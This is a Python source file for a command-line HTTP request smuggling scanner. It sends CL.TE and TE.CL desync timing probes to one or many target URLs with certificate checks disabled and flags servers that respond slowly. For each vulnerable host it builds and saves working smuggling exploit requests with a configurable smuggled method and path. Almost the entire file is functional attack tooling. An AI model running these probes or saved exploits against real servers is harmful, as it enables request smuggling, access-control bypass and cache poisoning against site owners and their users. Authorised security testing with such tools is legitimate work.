#!/usr/bin/env python3

import argparse
import os
import socket
import ssl
import statistics
import sys
import time
from datetime import datetime
from urllib.parse import urlparse


class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def disable_colors():
    Colors.HEADER = ''
    Colors.BLUE = ''
    Colors.CYAN = ''
    Colors.GREEN = ''
    Colors.YELLOW = ''
    Colors.RED = ''
    Colors.ENDC = ''
    Colors.BOLD = ''
    Colors.UNDERLINE = ''

class HTTPConnection:
    def __init__(self, host, port, use_ssl=True, timeout=10.0):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.timeout = timeout
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)

        if self.use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            self.sock = context.wrap_socket(self.sock, server_hostname=self.host)

        self.sock.connect((self.host, self.port))

    def send(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        self.sock.sendall(data)

    def recv(self, bufsize=8192):
        try:
            data = b""
            self.sock.settimeout(self.timeout)
            start_time = time.time()
            while time.time() - start_time < self.timeout:
                try:
                    chunk = self.sock.recv(bufsize)
                    if not chunk:
                        break
                    data += chunk
                    if len(chunk) < bufsize:
                        time.sleep(0.05)
                        break
                except socket.timeout:
                    break
            return data if data else None
        except Exception:
            return None

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except:
                pass

def test_payload(host, port, use_ssl, payload, timeout):
    try:
        conn = HTTPConnection(host, port, use_ssl, timeout)
        conn.connect()

        start = time.time()
        conn.send(payload)
        response = conn.recv()
        elapsed = time.time() - start

        conn.close()

        if response is None:
            return ("TIMEOUT", elapsed, None, 0)

        try:
            response_str = response.decode('utf-8', errors='ignore')
            status_line = response_str.split('\r\n')[0] if response_str else ""
            return ("OK", elapsed, status_line, len(response))
        except:
            return ("OK", elapsed, "", len(response))

    except socket.timeout:
        return ("TIMEOUT", timeout, None, 0)
    except ConnectionRefusedError:
        return ("REFUSED", 0, None, 0)
    except Exception as e:
        return ("ERROR", 0, str(e), 0)

def build_normal_request(host, endpoint, method="POST"):
    payload = f"{method} {endpoint} HTTP/1.1\r\n"
    payload += f"Host: {host}\r\n"
    payload += "User-Agent: Mozilla/5.0\r\n"
    payload += "Content-Type: application/x-www-form-urlencoded\r\n"
    payload += "Content-Length: 4\r\n"
    payload += "\r\n"
    payload += "x=1\r\n"
    return payload

def build_clte_timing_payload(host, endpoint, method="POST"):
    payload = f"{method} {endpoint} HTTP/1.1\r\n"
    payload += f"Host: {host}\r\n"
    payload += "User-Agent: Mozilla/5.0\r\n"
    payload += "Content-Length: 4\r\n"
    payload += "Transfer-Encoding: chunked\r\n"
    payload += "\r\n"
    payload += "1\r\n"
    payload += "Z\r\n"
    payload += "Q"
    return payload

def build_tecl_timing_payload(host, endpoint, method="POST"):
    payload = f"{method} {endpoint} HTTP/1.1\r\n"
    payload += f"Host: {host}\r\n"
    payload += "User-Agent: Mozilla/5.0\r\n"
    payload += "Content-Length: 6\r\n"
    payload += "Transfer-Encoding: chunked\r\n"
    payload += "\r\n"
    payload += "0\r\n"
    payload += "\r\n"
    payload += "X"
    return payload

def build_clte_exploit(host, endpoint, smuggled_method="GET", smuggled_path="/hopefully404"):
    smuggled = f"{smuggled_method} {smuggled_path} HTTP/1.1\r\n"
    smuggled += f"Host: {host}\r\n"
    smuggled += "Content-Length: 10\r\n"
    smuggled += "\r\n"
    smuggled += "x="

    chunk_size = hex(len(smuggled))[2:]
    chunk_data = f"{chunk_size}\r\n{smuggled}\r\n0\r\n\r\n"

    payload = f"POST {endpoint} HTTP/1.1\r\n"
    payload += f"Host: {host}\r\n"
    payload += "User-Agent: Mozilla/5.0\r\n"
    payload += f"Content-Length: {len(chunk_data)}\r\n"
    payload += "Transfer-Encoding: chunked\r\n"
    payload += "\r\n"
    payload += chunk_data

    return payload

def build_tecl_exploit(host, endpoint, smuggled_method="GET", smuggled_path="/hopefully404"):
    smuggled = f"{smuggled_method} {smuggled_path} HTTP/1.1\r\n"
    smuggled += "Content-Type: application/x-www-form-urlencoded\r\n"
    smuggled += "Content-Length: 15\r\n"
    smuggled += "\r\n"
    smuggled += "x=1"

    chunk_size = hex(len(smuggled))[2:]

    payload = f"POST {endpoint} HTTP/1.1\r\n"
    payload += f"Host: {host}\r\n"
    payload += "Content-Type: application/x-www-form-urlencoded\r\n"
    payload += "Content-Length: 4\r\n"
    payload += "Transfer-Encoding: chunked\r\n"
    payload += "\r\n"
    payload += f"{chunk_size}\r\n"
    payload += smuggled
    payload += "\r\n0\r\n"
    payload += "\r\n"

    return payload

def establish_baseline(host, port, use_ssl, endpoint, method, timeout, attempts=5):
    print(f"  {Colors.CYAN}[*] Establishing baseline...{Colors.ENDC}")

    normal_payload = build_normal_request(host, endpoint, method)
    timings = []

    for i in range(attempts):
        result = test_payload(host, port, use_ssl, normal_payload, timeout)
        if result[0] == "OK":
            timings.append(result[1])
        time.sleep(0.3)

    if len(timings) < 3:
        print(f"  {Colors.YELLOW}[!] Baseline failed{Colors.ENDC}")
        return None

    mean = statistics.mean(timings)
    stdev = statistics.stdev(timings) if len(timings) > 1 else 0

    print(f"  {Colors.GREEN}[✓]{Colors.ENDC} Baseline: {mean:.3f}s (±{stdev:.3f}s)")

    return {"mean": mean, "stdev": stdev, "timings": timings}

def test_clte_vulnerability(host, port, use_ssl, endpoint, method, timeout, baseline):
    print(f"  {Colors.CYAN}[*] Testing CL.TE desync...{Colors.ENDC}")

    attack_payload = build_clte_timing_payload(host, endpoint, method)
    normal_payload = build_normal_request(host, endpoint, method)

    attack_timings = []
    normal_timings = []
    timeout_count = 0

    for i in range(3):
        attack_result = test_payload(host, port, use_ssl, attack_payload, timeout)

        if attack_result[0] == "TIMEOUT":
            timeout_count += 1
            attack_timings.append(timeout)
        elif attack_result[0] == "OK":
            attack_timings.append(attack_result[1])

        time.sleep(0.5)

        normal_result = test_payload(host, port, use_ssl, normal_payload, timeout)
        if normal_result[0] == "OK":
            normal_timings.append(normal_result[1])

        time.sleep(0.5)

    if len(attack_timings) < 2:
        print(f"  {Colors.YELLOW}[~]{Colors.ENDC} CL.TE inconclusive")
        return None

    attack_mean = statistics.mean(attack_timings)
    normal_mean = statistics.mean(normal_timings) if normal_timings else baseline["mean"]

    if timeout_count >= 2:
        print(f"  {Colors.RED}[!] CL.TE VULNERABLE [HIGH]{Colors.ENDC}")
        print(f"      Attack: {attack_mean:.2f}s | Normal: {normal_mean:.2f}s | Timeouts: {timeout_count}/3")

        return {
            "vulnerable": True,
            "confidence": "HIGH",
            "details": f"Timeout ratio: {timeout_count}/3, timing diff: {attack_mean/normal_mean if normal_mean > 0 else 0:.1f}x"
        }
    elif attack_mean > (normal_mean + 2 * baseline["stdev"]) and attack_mean > normal_mean * 2:
        timing_diff = attack_mean / normal_mean if normal_mean > 0 else 0
        print(f"  {Colors.YELLOW}[!] CL.TE POTENTIALLY VULNERABLE [MEDIUM]{Colors.ENDC}")
        print(f"      Attack: {attack_mean:.2f}s | Normal: {normal_mean:.2f}s | Diff: {timing_diff:.1f}x")

        return {
            "vulnerable": True,
            "confidence": "MEDIUM",
            "details": f"Timing difference: {timing_diff:.1f}x"
        }
    else:
        print(f"  {Colors.GREEN}[✓]{Colors.ENDC} CL.TE not vulnerable")
        return None

def test_tecl_vulnerability(host, port, use_ssl, endpoint, method, timeout, baseline):
    print(f"  {Colors.CYAN}[*] Testing TE.CL desync...{Colors.ENDC}")

    attack_payload = build_tecl_timing_payload(host, endpoint, method)
    normal_payload = build_normal_request(host, endpoint, method)

    attack_timings = []
    normal_timings = []
    timeout_count = 0

    for i in range(3):
        attack_result = test_payload(host, port, use_ssl, attack_payload, timeout)

        if attack_result[0] == "TIMEOUT":
            timeout_count += 1
            attack_timings.append(timeout)
        elif attack_result[0] == "OK":
            attack_timings.append(attack_result[1])

        time.sleep(0.5)

        normal_result = test_payload(host, port, use_ssl, normal_payload, timeout)
        if normal_result[0] == "OK":
            normal_timings.append(normal_result[1])

        time.sleep(0.5)

    if len(attack_timings) < 2:
        print(f"  {Colors.YELLOW}[~]{Colors.ENDC} TE.CL inconclusive")
        return None

    attack_mean = statistics.mean(attack_timings)
    normal_mean = statistics.mean(normal_timings) if normal_timings else baseline["mean"]

    if timeout_count >= 2:
        print(f"  {Colors.RED}[!] TE.CL VULNERABLE [HIGH]{Colors.ENDC}")
        print(f"      Attack: {attack_mean:.2f}s | Normal: {normal_mean:.2f}s | Timeouts: {timeout_count}/3")

        return {
            "vulnerable": True,
            "confidence": "HIGH",
            "details": f"Timeout ratio: {timeout_count}/3, timing diff: {attack_mean/normal_mean if normal_mean > 0 else 0:.1f}x"
        }
    elif attack_mean > (normal_mean + 2 * baseline["stdev"]) and attack_mean > normal_mean * 2:
        timing_diff = attack_mean / normal_mean if normal_mean > 0 else 0
        print(f"  {Colors.YELLOW}[!] TE.CL POTENTIALLY VULNERABLE [MEDIUM]{Colors.ENDC}")
        print(f"      Attack: {attack_mean:.2f}s | Normal: {normal_mean:.2f}s | Diff: {timing_diff:.1f}x")

        return {
            "vulnerable": True,
            "confidence": "MEDIUM",
            "details": f"Timing difference: {timing_diff:.1f}x"
        }
    else:
        print(f"  {Colors.GREEN}[✓]{Colors.ENDC} TE.CL not vulnerable")
        return None

def scan_target(url, method="POST", timeout=10.0, output_dir="./soutput",
                smuggled_method="GET", smuggled_path="/hopefully404"):
    parsed = urlparse(url)

    if not parsed.scheme:
        url = "https://" + url
        parsed = urlparse(url)

    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    endpoint = parsed.path or "/"
    use_ssl = parsed.scheme == 'https'

    results = {
        'url': url,
        'host': host,
        'port': port,
        'endpoint': endpoint,
        'vulnerable': False,
        'vuln_type': None,
        'confidence': None,
        'details': []
    }

    print(f"\n{Colors.CYAN}→{Colors.ENDC} Testing: {Colors.BOLD}{url}{Colors.ENDC}")

    baseline = establish_baseline(host, port, use_ssl, endpoint, method, timeout)

    if not baseline:
        print(f"  {Colors.RED}[!] Cannot establish baseline - skipping{Colors.ENDC}")
        return results

    clte_result = test_clte_vulnerability(host, port, use_ssl, endpoint, method, timeout, baseline)
    if clte_result and clte_result["vulnerable"]:
        results['vulnerable'] = True
        results['vuln_type'] = 'CL.TE'
        results['confidence'] = clte_result['confidence']
        results['details'].append(clte_result['details'])

        exploit = build_clte_exploit(host, endpoint, smuggled_method, smuggled_path)

        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        filename = f"{output_dir}/CLTE_EXPLOIT_{host.replace('.', '_')}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(exploit)

        results['details'].append(f"Exploit saved: {filename}")
        print(f"      {Colors.GREEN}Exploit: {filename}{Colors.ENDC}")

    tecl_result = test_tecl_vulnerability(host, port, use_ssl, endpoint, method, timeout, baseline)
    if tecl_result and tecl_result["vulnerable"]:
        if not results['vulnerable']:
            results['vulnerable'] = True
            results['vuln_type'] = 'TE.CL'
            results['confidence'] = tecl_result['confidence']
        else:
            results['vuln_type'] = 'CL.TE+TE.CL'

        results['details'].append(tecl_result['details'])

        exploit = build_tecl_exploit(host, endpoint, smuggled_method, smuggled_path)

        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        filename = f"{output_dir}/TECL_EXPLOIT_{host.replace('.', '_')}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(exploit)

        results['details'].append(f"Exploit saved: {filename}")
        print(f"      {Colors.GREEN}Exploit: {filename}{Colors.ENDC}")

    return results

def print_summary(all_results):
    vulnerable = sum(1 for r in all_results if r['vulnerable'])

    if vulnerable > 0:
        print(f"\n{Colors.RED}{Colors.BOLD}VULNERABLE TARGETS:{Colors.ENDC}")
        for result in all_results:
            if result['vulnerable']:
                conf_color = Colors.RED if result['confidence'] == 'HIGH' else Colors.YELLOW
                print(f"  {Colors.RED}[!]{Colors.ENDC} {result['url']} - {Colors.RED}{result['vuln_type']}{Colors.ENDC} {conf_color}[{result['confidence']}]{Colors.ENDC}")
                for detail in result['details']:
                    print(f"      {detail}")

def main():
    parser = argparse.ArgumentParser(description='HTTP Desync Scanner')
    parser.add_argument('-u', help='Single target URL')
    parser.add_argument('-f', help='File with URLs (one per line)')
    parser.add_argument('-m', default='POST', help='HTTP method (default: POST)')
    parser.add_argument('-t', type=float, default=10.0, help='Timeout in seconds (default: 10.0)')
    parser.add_argument('-o', default='./soutput', help='Output directory (default: ./soutput)')
    parser.add_argument('--no-color', action='store_true', help='Disable colors')
    parser.add_argument('-d', type=float, default=0.5, help='Delay between requests (default: 0.5s)')
    parser.add_argument('-sm', default='GET', help='Method for smuggled request (default: GET)')
    parser.add_argument('-path', default='/hopefully404', help='Path for smuggled request (default: /hopefully404)')

    args = parser.parse_args()

    if args.no_color or os.name == 'nt':
        disable_colors()

    urls = []
    if args.u:
        urls.append(args.u)
    elif args.f:
        try:
            with open(args.f, 'r') as f:
                urls = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
        except FileNotFoundError:
            print(f"{Colors.RED}[ERROR]{Colors.ENDC} File not found: {args.f}")
            sys.exit(1)
    else:
        print(f"{Colors.RED}[ERROR]{Colors.ENDC} No target specified. Use -u or -f")
        sys.exit(1)

    print(f"\n{Colors.CYAN}Scan Configuration:{Colors.ENDC}")
    print(f"  └─ HTTP Method: {Colors.BOLD}{args.m}{Colors.ENDC}")
    print(f"  └─ Timeout: {Colors.BOLD}{args.t}s{Colors.ENDC}")
    print(f"  └─ Total Targets: {Colors.BOLD}{len(urls)}{Colors.ENDC}")
    print(f"  └─ Output Directory: {Colors.BOLD}{args.o}{Colors.ENDC}")
    print(f"\n{Colors.CYAN}Smuggled Request Configuration:{Colors.ENDC}")
    print(f"  └─ Method: {Colors.BOLD}{args.sm}{Colors.ENDC}")
    print(f"  └─ Path: {Colors.BOLD}{args.path}{Colors.ENDC}")
    print(f"  └─ Host: {Colors.BOLD}Target Host{Colors.ENDC}")

    all_results = []

    for url in urls:
        result = scan_target(url, args.m, args.t, args.o,
                           args.sm, args.path)
        all_results.append(result)
        if len(urls) > 1:
            time.sleep(args.d)

    print_summary(all_results)
    print(f"\nCompleted at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted, exiting...{Colors.ENDC}")
        sys.exit(0)
